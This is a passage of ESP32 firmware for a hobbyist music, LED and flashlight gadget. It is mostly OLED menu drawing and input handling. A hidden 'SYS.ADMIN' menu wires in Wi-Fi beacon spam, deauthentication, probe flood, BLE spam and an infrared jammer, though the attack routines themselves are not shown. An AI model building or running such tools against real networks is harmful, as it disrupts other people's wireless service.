        snprintf(b, sizeof(b), "%.16s", songName(si).c_str());
        display.setCursor(24, y + 4);
        display.print(b);
    }
    display.fillRect(0, 0, SCR_W, baseY - 2, BLACK);
    hdr("TRACKS");
    bool wf = smSel < 0.5f;
    if (wf) display.fillRoundRect(2, 14, 20, 10, 3, WHITE);
    iWifi(8, 15, wf ? BLACK : WHITE);
    display.display();
}

// ═══ PLAYER ═══
static void sPlayer() {
    display.clearDisplay();
    display.drawRoundRect(4, 18, 24, 24, 4, WHITE);
    iMusic(12, 26, WHITE);
    display.setTextColor(WHITE); display.setTextSize(1);
    String n = songName(g.currentSong);
    char t[16]; strncpy(t, n.c_str(), 14); t[14] = 0;
    display.setCursor(34, 20); display.print(t);
    display.setCursor(34, 30); display.print("Now Playing");
    for (int i = 0; i < 4; i++) {
        int h = 2 + ((animFrame * (i+1)) % 12);
        display.fillRect(100 + i*5, 42 - h, 3, h, WHITE);
    }
    int bx = 4, by = 50, bw = 120;
    display.drawRoundRect(bx, by, bw, 4, 2, WHITE);
    int fw = (animFrame/2) % bw;
    display.fillRoundRect(bx, by, fw, 4, 2, WHITE);
    char tb[16]; snprintf(tb, sizeof(tb), "%d:%02d", (animFrame/2)/10/60, (animFrame/2)/10%60);
    display.setCursor(4, 56); display.print(tb);
    display.setCursor(102, 56); display.print("4:05");
    hdrL("PLAYING");
    display.display();
}

// ═══ BT MENUS ═══
const char* BT_M[] = {"Scan Devices","Connect Last","Forget Saved"};
static void sBtMenu() {
    const int count = 3, rowH = 12, baseY = 16;
    smTick(M_BT_MENU, g.subSel, 0);
    display.clearDisplay();
    hdr("BLUETOOTH");
    float pillY = baseY + smSel * rowH;
    display.fillRoundRect(0, (int)round(pillY), SCR_W, rowH - 1, 3, WHITE);
    for (int idx = 0; idx < count; idx++) {
        int y = baseY + idx * rowH;
        bool s = fabs((float)idx - smSel) < 0.5f;
        uint16_t c = s ? BLACK : WHITE;
        display.setTextColor(c);
        display.fillTriangle(2, y+5, 5, y+2, 5, y+8, c);
        iBT(10, y+2, c);
        display.setCursor(22, y+3);
        display.print(BT_M[idx]);
    }
    display.setTextColor(WHITE);
    display.display();
}

static void sBtScan() {
    display.clearDisplay(); hdrL("SCANNING");
    int cx = SCR_W/2, cy = 34;
    for (int ring = 0; ring < 3; ring++) {
        int r = ((animFrame * 2) + ring * 15) % 45;
        if (r < 4) continue;
        uint16_t c = (r < 15) ? WHITE : (r < 30) ? 0x7BEF : 0x39E7;
        display.drawCircle(cx, cy, r, c);
    }
    display.fillCircle(cx, cy, 3, WHITE);
    float ang = animFrame * 0.12f;
    for (int len = 6; len < 40; len += 2) {
        int sx = cx + (int)(cos(ang) * len);
        int sy = cy + (int)(sin(ang) * len);
        if (sx >= 0 && sx < SCR_W && sy >= 20 && sy < 56) display.drawPixel(sx, sy, WHITE);
    }
    display.setTextSize(1); display.setTextColor(WHITE);
    display.setCursor(4, 4); display.print("SEARCHING");
    int dots = (animFrame/3) % 9;
    for (int i = 0; i < 8; i++) {
        int x = 24 + i*11;
        if (i < dots) display.fillCircle(x, 58, 2, WHITE);
        else display.drawCircle(x, 58, 2, WHITE);
    }
    display.display();
}

// ═══ LED MENUS ═══
const char* LED_M[] = {"Effects","Music Sync","Brightness","WiFi Control"};
static void sLedMenu() {
    const int count = 4, rowH = 11, baseY = 16;
    smTick(M_LED_MENU, g.subSel, 0);
    display.clearDisplay(); hdr("LED EFFECTS");
    float pillY = baseY + smSel * rowH;
    display.fillRoundRect(0, (int)round(pillY), SCR_W, rowH - 1, 3, WHITE);
    for (int idx = 0; idx < count; idx++) {
        int y = baseY + idx * rowH;
        bool s = fabs((float)idx - smSel) < 0.5f;
        uint16_t c = s ? BLACK : WHITE;
        display.setTextColor(c);
        display.fillTriangle(2, y+5, 5, y+2, 5, y+8, c);
        if (idx == 3) iWifi(9, y+1, c); else iLED(9, y+1, c);
        display.setCursor(21, y+2);
        display.print(LED_M[idx]);
    }
    display.setTextColor(WHITE);
    display.display();
}

const char* FX[] = {"Solid","Rainbow","Breathe","Chase"};
static void sLedFx() {
    const int count = 4, rowH = 11, baseY = 16;
    smTick(M_LED_FX, g.subSel, 0);
    display.clearDisplay(); hdr("EFFECTS");
    float pillY = baseY + smSel * rowH;
    display.fillRoundRect(0, (int)round(pillY), SCR_W, rowH - 1, 3, WHITE);
    for (int idx = 0; idx < count; idx++) {
        int y = baseY + idx * rowH;
        bool s = fabs((float)idx - smSel) < 0.5f;
        display.setTextColor(s ? BLACK : WHITE);
        display.setCursor(12, y+2);
        display.print(FX[idx]);
    }
    display.setTextColor(WHITE);
    display.display();
}

static void sLedBright() {
    display.clearDisplay(); hdrL("BRIGHTNESS");
    int pct = (g.ledBright * 100) / 255;
    display.setTextSize(3); display.setTextColor(WHITE);
    char b[8]; snprintf(b,sizeof(b),"%d%%",pct);
    int tw = strlen(b)*18;
    display.setCursor((SCR_W-tw)/2, 22); display.print(b);
    display.drawRect(6,52,SCR_W-12,8,WHITE);
    int fw = (g.ledBright * (SCR_W-16))/255;
    if (fw > 0) display.fillRect(8,54,fw,4,WHITE);
    display.display();
}

static void sLedWifi() {
    display.clearDisplay(); hdrL("WIFI CONTROL");
    int cx=SCR_W/2, cy=30;
    display.fillCircle(cx, cy+10, 3, WHITE);
    for (int arc = 0; arc < 3; arc++) {
        int r = 8 + arc*7;
        if ((animFrame/3 + arc) % 4 < 3) {
            for (int a = 215; a <= 325; a += 6) {
                float rad = a * 3.14159f / 180.0f;
                display.fillCircle(cx + (int)(cos(rad)*r), cy+10+(int)(sin(rad)*r), 1, WHITE);
            }
        }
    }
    display.setTextSize(1); display.setTextColor(WHITE);
    const char* t = webRunning ? "AP ACTIVE" : "AP OFF";
    int tw = strlen(t)*6;
    display.setCursor((SCR_W-tw)/2, 52); display.print(t);
    if (webRunning) { display.setCursor(4, 58); display.print("192.168.4.1"); }
    display.display();
}

// ═══ FLASHLIGHT ═══
static void sFlash() {
    const int count = 5, rowH = 11, baseY = 16;
    int targetOffset = (g.subSel >= 3) ? (g.subSel - 2) : 0;
    if (targetOffset + 4 > count) targetOffset = 1;
    if (targetOffset < 0) targetOffset = 0;
    smTick(M_FLASH_MENU, g.subSel, targetOffset);
    display.clearDisplay();
    display.drawFastHLine(0,0,SCR_W,WHITE);
    display.setTextSize(1); display.setTextColor(WHITE);
    display.setCursor(4,5);
    display.print(g.flashOn ? "FLASHLIGHT [ON]" : "FLASHLIGHT [OFF]");
    drawBatteryLight(SCR_W-22, 4);
    const char* it[] = {"Power: ON","Bright: 75%","Color: White","Effect: Solid","Done"};
    float pillY = baseY + (smSel - smScroll) * rowH;
    if (pillY > baseY - rowH && pillY < baseY + 4 * rowH)
        display.fillRoundRect(0, (int)round(pillY), SCR_W, rowH - 1, 3, WHITE);
    int idxLo = (int)floor(smScroll) - 1;
    int idxHi = (int)floor(smScroll) + 5;
    for (int idx = idxLo; idx <= idxHi; idx++) {
        if (idx < 0 || idx >= count) continue;
        float yf = baseY + (idx - smScroll) * rowH;
        if (yf < baseY - rowH || yf > baseY + 4 * rowH) continue;
        int y = (int)round(yf);
        bool s = fabs((float)idx - smSel) < 0.5f;
        uint16_t c = s ? BLACK : WHITE;
        display.setTextColor(c);
        display.fillTriangle(2, y+5, 5, y+2, 5, y+8, c);
        iFlash(9, y+1, c);
        display.setCursor(21, y+2);
        display.print(it[idx]);
    }
    display.setTextColor(WHITE);
    display.display();
}

// ═══ SETTINGS ═══
const char* SET_M[] = {"Display Sleep","Screen Bright","Auto BT","Device Info","Factory Reset"};
static void sSettings() {
    const int count = 5, rowH = 11, baseY = 16;
    int targetOffset = (g.subSel >= 3) ? (g.subSel - 2) : 0;
    if (targetOffset + 4 > count) targetOffset = 1;
    if (targetOffset < 0) targetOffset = 0;
    smTick(M_SETTINGS, g.subSel, targetOffset);
    display.clearDisplay(); hdr("SETTINGS");
    float pillY = baseY + (smSel - smScroll) * rowH;
    if (pillY > baseY - rowH && pillY < baseY + 4 * rowH)
        display.fillRoundRect(0, (int)round(pillY), SCR_W, rowH - 1, 3, WHITE);
    int idxLo = (int)floor(smScroll) - 1;
    int idxHi = (int)floor(smScroll) + 5;
    for (int idx = idxLo; idx <= idxHi; idx++) {
        if (idx < 0 || idx >= count) continue;
        float yf = baseY + (idx - smScroll) * rowH;
        if (yf < baseY - rowH || yf > baseY + 4 * rowH) continue;
        int y = (int)round(yf);
        bool s = fabs((float)idx - smSel) < 0.5f;
        display.setTextColor(s ? BLACK : WHITE);
        display.setCursor(12, y+2);
        display.print(SET_M[idx]);
    }
    display.setTextColor(WHITE);
    display.display();
}

static void sInfo() {
    display.clearDisplay(); hdrL("DEVICE INFO");
    display.setTextSize(1); display.setTextColor(WHITE);
    display.setCursor(4, 18); display.print("SOUMYA Gadget v9.0");
    display.setCursor(4, 28); display.print("ESP32-WROOM-32");
    display.setCursor(4, 38); display.print("Core: 2.0.17");
    char u[20]; snprintf(u, sizeof(u), "Up: %lu min", millis()/60000);
    display.setCursor(4, 48); display.print(u);
    char s[20]; snprintf(s, sizeof(s), "SD: %d songs", songCount);
    display.setCursor(4, 56); display.print(s);
    display.display();
}

static void sWifiFiles() {
    display.clearDisplay(); hdrL("WIFI FILES");
    int cx=30, cy=32;
    display.fillCircle(cx, cy+6, 2, WHITE);
    for (int r = 5; r <= 14; r += 4)
        for (int a = 215; a <= 325; a += 12) {
            float rad = a * 3.14159f / 180.0f;
            display.drawPixel(cx + (int)(cos(rad)*r), cy+5+(int)(sin(rad)*r), WHITE);
        }
    display.setTextSize(1); display.setTextColor(WHITE);
    display.setCursor(58, 18); display.print(webRunning ? "AP ACTIVE" : "AP OFF");
    if (webRunning) {
        display.setCursor(58, 30); display.print("ESP32-Gadget");
        display.setCursor(58, 40); display.print("192.168.4.1");
    }
    display.drawFastHLine(0, 50, SCR_W, 0x39E7);
    display.setCursor(4, 55); display.print("Open browser to upload");
    display.display();
}

// ═══ CYBER TERMINAL HIDDEN MENUS ═══
void drawCyberMenu(int sel, const char* title, const char** items, int count, int sceneID) {
    int rowH = 14, baseY = 18;
    smTick(sceneID, sel, 0);
    display.clearDisplay();
    hdr(title);
    for (int idx = 0; idx < count; idx++) {
        int y = baseY + idx * rowH;
        bool s = fabs((float)idx - smSel) < 0.5f;
        if (s) {
            display.fillRect(2, y, SCR_W-4, rowH-1, WHITE);
            display.setTextColor(BLACK);
            display.setCursor(6, y+3); display.print("> "); display.print(items[idx]);
        } else {
            display.setTextColor(WHITE);
            display.setCursor(18, y+3); display.print(items[idx]);
        }
    }
    display.display();
}

const char* HID_M[] = {"WiFi Tools","BT Tools","IR Remote"};
static void sHidden() { drawCyberMenu(g.subSel, "SYS.ADMIN", HID_M, 3, M_HIDDEN); }
const char* WT_M[] = {"Scan Networks","Beacon Spam","Deauth Attack","Probe Flood"};
static void sWifiT() { drawCyberMenu(g.subSel, "WIFI_OPS", WT_M, 4, M_WIFI_TOOLS); }
const char* BT_T[] = {"BLE Scan","Classic Scan","BLE Spam"};
static void sBtT() { drawCyberMenu(g.subSel, "BT_OPS", BT_T, 3, M_BT_TOOLS); }
const char* IR_M[] = {"Learn Code","Transmit Code","IR Jammer"};
static void sIrM() { drawCyberMenu(g.subSel, "IR_OPS", IR_M, 3, M_IR_MENU); }

static void sAttackRun() {
    display.clearDisplay();
    hdrL("EXEC_ATTACK");
    for (int i = 0; i < 8; i++) {
        int x = (i * 15 + animFrame*2) % SCR_W;
        int y = (animFrame * (3 + i%3)) % SCR_H;
        display.drawFastVLine(x, y, random(4,10), WHITE);
    }
    int bx = SCR_W/2 - 38, by = 22;
    display.fillRect(bx, by, 76, 16, BLACK);
    display.drawRect(bx, by, 76, 16, WHITE);
    display.setTextSize(1); display.setTextColor(WHITE);
    display.setCursor(bx + 6, by + 4);
    const char* m = (atkMode == ATK_BEACON) ? "BEACON" : (atkMode == ATK_DEAUTH) ? "DEAUTH" : "PROBE";
    display.print(m);
    if ((animFrame/3) % 2 == 0) display.print("...");
    else display.print("  _");
    char pk[16]; snprintf(pk, sizeof(pk), "%d pkts", atkPkts);
    display.setCursor(bx + 6, by + 22); display.print(pk);
    display.display();
}

static void sIrLearn() {
    display.clearDisplay(); hdrL("SCAN_IR");
    int cx = SCR_W/2, cy = 34;
    display.drawCircle(cx, cy, 15, WHITE);
    display.drawCircle(cx, cy, 14, WHITE);
    int scanY = cy - 14 + ((animFrame*2) % 28);
    display.drawFastHLine(cx-14, scanY, 28, WHITE);
    display.fillRect(cx-14, cy-4, 28, 9, BLACK);
    display.setTextSize(1); display.setTextColor(WHITE);
    if (animFrame % 4 < 2) { display.setCursor(cx-12, cy-3); display.print("0101"); }
    display.setCursor((SCR_W - 12*6)/2, 54); display.print("WAITING CODE");
    display.display();
}
static void sIrTx() {
    display.clearDisplay(); hdrL("TRANSMITTING");
    int cx = SCR_W/2, cy = 32;
    display.fillRect(cx-2, cy, 4, 15, WHITE);
    display.fillTriangle(cx, cy-4, cx-6, cy+2, cx+6, cy+2, WHITE);
    int r1 = (animFrame * 2) % 24;
    if (r1 > 4) { display.drawCircleHelper(cx, cy-4, r1, 1, WHITE); display.drawCircleHelper(cx, cy-4, r1, 2, WHITE); }
    display.setTextSize(1);
    display.setCursor((SCR_W - 7*6)/2, 54); display.print("TX: PWR");
    display.display();
}
static void sIrJam() {
    display.clearDisplay(); hdr("JAMMING");
    int waveBase = 35;
    for (int x = 0; x < SCR_W; x++) {
        int y1 = waveBase + sin((x + animFrame*4) * 0.1f) * 12;
        int y2 = waveBase + sin((x - animFrame*6) * 0.15f) * 8;
        display.drawPixel(x, y1, WHITE);
        display.drawPixel(x, y2, WHITE);
    }
    display.setTextSize(1);
    display.setCursor(30, 56); display.print("TX: 940nm");
    display.display();
}

static void drawCurrent() {
    switch (g.mode) {
        case M_BOOT: sBoot(); break;
        case M_MAIN: sMain(); break;
        case M_SONGS: sSongs(); break;
        case M_PLAYER: sPlayer(); break;
        case M_BT_MENU: sBtMenu(); break;
        case M_BT_SCAN: sBtScan(); break;
        case M_LED_MENU: sLedMenu(); break;
        case M_LED_FX: sLedFx(); break;
        case M_LED_BRIGHT: sLedBright(); break;
        case M_LED_WIFI: sLedWifi(); break;
        case M_FLASH_MENU: sFlash(); break;
        case M_SETTINGS: sSettings(); break;
        case M_INFO: sInfo(); break;
        case M_WIFI_FILES: sWifiFiles(); break;
        case M_HIDDEN: sHidden(); break;
        case M_WIFI_TOOLS: sWifiT(); break;
        case M_BT_TOOLS: sBtT(); break;
        case M_IR_MENU: sIrM(); break;
        case M_ATTACK_RUN: sAttackRun(); break;
        case M_IR_LEARN: sIrLearn(); break;
        case M_IR_TX: sIrTx(); break;
        case M_IR_JAM: sIrJam(); break;
        default: break;
    }
}

// ═══ MENU HANDLERS ═══
static void onMain(int ev) {
    if (ev == 0) g.mainSel = (g.mainSel - 1 + 6) % 6;
    else if (ev == 1) g.mainSel = (g.mainSel + 1) % 6;
    else if (ev == 2) {
        switch (g.mainSel) {
            case 0: if (songCount) { playSong(random(0, songCount)); g.mode = M_PLAYER; } break;
            case 1: g.mode = M_SONGS; g.subSel = 0; break;
            case 2: g.mode = M_BT_MENU; g.subSel = 0; break;
            case 3: g.mode = M_GAMES; g.subSel = 0; break;
            case 4: g.mode = M_LED_MENU; g.subSel = 0; break;
            case 5: g.mode = M_FLASH_MENU; g.subSel = 0; break;
        }
    }
}
static void onSongs(int ev) {
    int total = songCount + 1;
    if (ev == 0) g.subSel = (g.subSel - 1 + total) % total;
    else if (ev == 1) g.subSel = (g.subSel + 1) % total;
    else if (ev == 2) {
        if (g.subSel == 0) { g.mode = M_WIFI_FILES; startWeb(); }
        else { playSong(g.subSel - 1); g.mode = M_PLAYER; }
    } else if (ev == 3) { g.mode = M_MAIN; g.mainSel = 1; }
}
static void onPlayer(int ev) {
    if (ev == 0) g.volume = min(g.volume+5, 100);
    else if (ev == 1) g.volume = max(g.volume-5, 0);
    else if (ev == 2) g.isPlaying = !g.isPlaying;
    else if (ev == 3) { g.mode = M_SONGS; g.subSel = g.currentSong + 1; }
}
static void onBtMenu(int ev) {
    if (ev == 0) g.subSel = (g.subSel - 1 + 3) % 3;
    else if (ev == 1) g.subSel = (g.subSel + 1) % 3;
    else if (ev == 2 && g.subSel == 0) g.mode = M_BT_SCAN;
    else if (ev == 3) { g.mode = M_MAIN; g.mainSel = 2; }
}
static void onLedMenu(int ev) {
    if (ev == 0) g.subSel = (g.subSel - 1 + 4) % 4;
    else if (ev == 1) g.subSel = (g.subSel + 1) % 4;
    else if (ev == 2) {
        if (g.subSel == 0) { g.mode = M_LED_FX; g.subSel = g.curEffect; }
        else if (g.subSel == 2) g.mode = M_LED_BRIGHT;
        else if (g.subSel == 3) { g.mode = M_LED_WIFI; if (!webRunning) startWeb(); }
    } else if (ev == 3) { g.mode = M_MAIN; g.mainSel = 4; }
}
static void onLedFx(int ev) {
    if (ev == 0) g.subSel = (g.subSel - 1 + 4) % 4;
    else if (ev == 1) g.subSel = (g.subSel + 1) % 4;
    else if (ev == 2) g.curEffect = g.subSel;
    else if (ev == 3) { g.mode = M_LED_MENU; g.subSel = 0; }
}
static void onLedBright(int ev) {
    if (ev == 0) { g.ledBright = min(g.ledBright + 15, 255); strip.setBrightness(g.ledBright); }
    else if (ev == 1) { g.ledBright = max(g.ledBright - 15, 0); strip.setBrightness(g.ledBright); }
    else if (ev == 3) { g.mode = M_LED_MENU; g.subSel = 2; }
}
static void onLedWifi(int ev) {
    if (ev == 2) { if (!webRunning) startWeb(); else stopWeb(); }
    else if (ev == 3) { g.mode = M_LED_MENU; g.subSel = 3; }
}
static void onFlash(int ev) {
    if (ev == 0) g.subSel = (g.subSel - 1 + 5) % 5;
    else if (ev == 1) g.subSel = (g.subSel + 1) % 5;
    else if (ev == 2) {
        switch (g.subSel) {
            case 0: flashSet(!g.flashOn); break;
            case 1: g.flashBright = (g.flashBright + 25) % 125; if (!g.flashBright) g.flashBright = 25; flashApply(); break;
            case 2: g.flashColor = (g.flashColor + 1) % 7; flashApply(); break;
            case 3: g.flashEffect = (g.flashEffect + 1) % 5; break;
            case 4: g.mode = M_MAIN; g.mainSel = 5; break;
        }
    } else if (ev == 3) { g.mode = M_MAIN; g.mainSel = 5; }
}
static void onSettings(int ev) {
    if (ev == 0) g.subSel = (g.subSel - 1 + 5) % 5;
    else if (ev == 1) g.subSel = (g.subSel + 1) % 5;
    else if (ev == 2) {
        if (g.subSel == 0) g.displaySleepEnabled = !g.displaySleepEnabled;
        else if (g.subSel == 1) { g.ledBright = (g.ledBright + 50) % 256; strip.setBrightness(g.ledBright); }
        else if (g.subSel == 3) g.mode = M_INFO;
    } else if (ev == 3) g.mode = M_MAIN;
}
static void onWifiFiles(int ev) {
    if (ev == 3) { if (webRunning) stopWeb(); g.mode = M_SONGS; g.subSel = 0; }
}
static void onHidden(int ev) {
    if (ev == 0) g.subSel = (g.subSel - 1 + 3) % 3;
    else if (ev == 1) g.subSel = (g.subSel + 1) % 3;
    else if (ev == 2) {
        if (g.subSel == 0) { g.mode = M_WIFI_TOOLS; g.subSel = 0; }
        else if (g.subSel == 1) { g.mode = M_BT_TOOLS; g.subSel = 0; }
        else if (g.subSel == 2) { g.mode = M_IR_MENU; g.subSel = 0; }
    } else if (ev == 3) g.mode = M_MAIN;
}
static void onWifiTools(int ev) {
    if (ev == 0) g.subSel = (g.subSel - 1 + 4) % 4;
    else if (ev == 1) g.subSel = (g.subSel + 1) % 4;
    else if (ev == 2) {
        if (g.subSel == 0) wifiScan();
        else if (g.subSel == 1) { startBeacon(); g.mode = M_ATTACK_RUN; }
        else if (g.subSel == 2) { if (!apCount) wifiScan(); if (apCount) { startDeauth(0); g.mode = M_ATTACK_RUN; } }
        else if (g.subSel == 3) { startProbe(); g.mode = M_ATTACK_RUN; }
    } else if (ev == 3) { g.mode = M_HIDDEN; g.subSel = 0; }
}
static void onBtTools(int ev) {
    if (ev == 0) g.subSel = (g.subSel - 1 + 3) % 3;
    else if (ev == 1) g.subSel = (g.subSel + 1) % 3;
    else if (ev == 3) { g.mode = M_HIDDEN; g.subSel = 1; }
}
static void onIrMenu(int ev) {
    if (ev == 0) g.subSel = (g.subSel - 1 + 3) % 3;
    else if (ev == 1) g.subSel = (g.subSel + 1) % 3;
    else if (ev == 2) {
        if (g.subSel == 0) g.mode = M_IR_LEARN;
        else if (g.subSel == 1) g.mode = M_IR_TX;
        else g.mode = M_IR_JAM;
    } else if (ev == 3) { g.mode = M_HIDDEN; g.subSel = 2; }
}
static void onAttack(int ev) {
    if (ev == 2 || ev == 3) { stopAttack(); g.mode = M_WIFI_TOOLS; g.subSel = 1; }
}
static void onGames(int ev) {
    if (ev == 3) { g.mode = M_MAIN; g.mainSel = 3; }
}

// ═══ POLL — SERIAL ONLY ═══
static int pollButtons() {
    if (gSerialEv >= 0) { int e = gSerialEv; gSerialEv = -1; return e; }
    return -1;
}

// ═══ UI TASK ═══
static void uiTask(void*) {
    unsigned long lastDraw = 0;
    for (;;) {
        int ev = pollButtons();
        if (ev >= 0) wakeDisplay();
        checkSleep();
        if (webRunning) {
            ledServer.handleClient();
            fileServer.handleClient();
            attackServer.handleClient();
        }
        if (g.mode == M_LED_MENU || g.mode == M_LED_FX || g.mode == M_LED_WIFI ||
            g.mode == M_IR_LEARN || g.mode == M_IR_TX || g.mode == M_IR_JAM ||
            g.mode == M_ATTACK_RUN || g.mode == M_BT_SCAN) updateLED();
        if (g.flashOn) flashApply();

        if (ev >= 0 && ev < 4) {
            switch (g.mode) {
                case M_MAIN: onMain(ev); break;
                case M_SONGS: onSongs(ev); break;
                case M_PLAYER: onPlayer(ev); break;
                case M_BT_MENU: onBtMenu(ev); break;
                case M_LED_MENU: onLedMenu(ev); break;
                case M_LED_FX: onLedFx(ev); break;
                case M_LED_BRIGHT: onLedBright(ev); break;
                case M_LED_WIFI: onLedWifi(ev); break;
                case M_FLASH_MENU: onFlash(ev); break;
                case M_SETTINGS: onSettings(ev); break;
                case M_INFO: if (ev == 3) g.mode = M_SETTINGS; break;
                case M_WIFI_FILES: onWifiFiles(ev); break;
                case M_HIDDEN: onHidden(ev); break;
                case M_WIFI_TOOLS: onWifiTools(ev); break;
                case M_BT_TOOLS: onBtTools(ev); break;
                case M_IR_MENU: onIrMenu(ev); break;
                case M_ATTACK_RUN: onAttack(ev); break;
                case M_IR_LEARN: case M_IR_TX: case M_IR_JAM:
                    if (ev == 3) { g.mode = M_IR_MENU; g.subSel = 0; } break;
                case M_BT_SCAN: if (ev == 3) { g.mode = M_BT_MENU; g.subSel = 0; } break;
                case M_GAMES: onGames(ev); break;
                default: if (ev == 3) g.mode = M_MAIN; break;
            }
        }

        unsigned long now = millis();
        if (now - lastDraw > 100) {
            lastDraw = now;
            if (!displayOff) drawCurrent();
        }
        vTaskDelay(pdMS_TO_TICKS(15));
    }
}

static void audioTask(void*) {
    for (;;) {
        if (g.isPlaying && audioMP3 && audioMP3->isRunning()) {
            if (!audioMP3->loop()) { g.isPlaying = false; nextSong(); }
        }
        vTaskDelay(pdMS_TO_TICKS(1));
    }
}

// ═══ SETUP ═══
void setup() {
    Serial.begin(115200);
    delay(500);
    Serial.println("\n=== SOUMYA Gadget v9.0 FINAL ===");
    Serial.println("Serial commands: up / down / sel / back");

    SPI.begin(PIN_SD_SCK, PIN_SD_MISO, PIN_SD_MOSI, PIN_SD_CS);
    if (!SD.begin(PIN_SD_CS)) Serial.println("[!] SD FAIL");
    else { Serial.println("[+] SD OK"); loadSongs(); Serial.printf("[+] %d songs\n", songCount); }

    Wire.begin(OLED_SDA, OLED_SCL);
    if (!display.begin(SSD1306_SWITCHCAPVCC, OLED_ADDR)) {
        Serial.println("[!] OLED FAIL");
        while (1) delay(1000);
    }
    display.clearDisplay(); display.display();

    strip.begin();
    strip.setBrightness(g.ledBright);
    strip.clear(); strip.show();

    flashStrip.begin();
    flashStrip.setBrightness(g.flashBright * 255 / 100);
    flashStrip.clear(); flashStrip.show();

    audioRB = new AudioOutRB();
    randomSeed(analogRead(0));
    lastActivity = millis();

    xTaskCreatePinnedToCore(audioTask, "audio", 8192, nullptr, 2, nullptr, 1);
    xTaskCreatePinnedToCore(uiTask, "ui", 12288, nullptr, 1, nullptr, 0);
}

void loop() {
    static String cmdBuf = "";
    while (Serial.available()) {
        char c = Serial.read();
        if (c == '\n' || c == '\r') {
            cmdBuf.trim(); cmdBuf.toLowerCase();
            if (cmdBuf == "up" || cmdBuf == "u") gSerialEv = 0;
            else if (cmdBuf == "down" || cmdBuf == "d") gSerialEv = 1;
            else if (cmdBuf == "sel" || cmdBuf == "s") gSerialEv = 2;
            else if (cmdBuf == "back" || cmdBuf == "b") gSerialEv = 3;
            else if (cmdBuf == "help" || cmdBuf == "?") {
                Serial.println("\n--- Commands ---");
                Serial.println("  up/u       UP");
                Serial.println("  down/d     DOWN");
                Serial.println("  sel/s      SELECT");
                Serial.println("  back/b     BACK");
                Serial.println("---\n");
            }
            cmdBuf = "";
        } else cmdBuf += c;
    }
    vTaskDelay(pdMS_TO_TICKS(20));
}
